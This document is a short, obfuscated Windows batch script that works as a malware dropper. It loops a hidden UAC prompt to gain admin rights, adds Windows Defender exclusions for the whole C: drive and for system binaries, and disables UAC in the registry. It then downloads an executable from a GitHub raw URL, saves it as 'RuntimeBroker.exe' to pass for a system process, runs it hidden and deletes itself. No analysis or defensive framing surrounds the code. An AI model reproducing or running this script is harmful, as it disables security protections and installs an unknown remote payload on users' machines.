@echo off & setlocal enableDelayedExpansion
set "iEDw=>nul" & set "Jedm=2>&1" & set "Wthdf=SESSION" & set "pXgd=NET"
%pXgd% %Wthdf% %iEDw% %Jedm%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "lYnX=bar" & set "JKNnc=qux" & set "iBoU=foo" & set "Wxc=baz" & rem sshc yQuxS yqYw
set "xPd=powershell -ExecutionPolicy Bypass -Command"
set "LtImA=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "HYT='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "CCd='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!xPd! "!LtImA! !HYT! !CCd!" %iEDw% %Jedm%
set "myii=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "tTt=-Name 'EnableLUA' -Value 0"
!xPd! "!myii! !tTt!" %iEDw% %Jedm%
set "cbkD=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!xPd! "!cbkD!" %iEDw% %Jedm%
if !errorlevel! neq 0 (goto %a%)
set "wdZ=timeout /t" & !wdZ! 2 %iEDw% %Jedm%
set "YJq=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "qvwKk=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "XKXWW=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!xPd! "!YJq! !qvwKk! !XKXWW!" %iEDw% %Jedm%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!wdZ! 1 %iEDw% %Jedm% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %iEDw% %Jedm%
del /f /q "%~f0" %iEDw% %Jedm%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %iEDw% %Jedm%
if !errorlevel! neq 0 (!wdZ! 3 %iEDw% %Jedm% & goto %b%)
exit /b
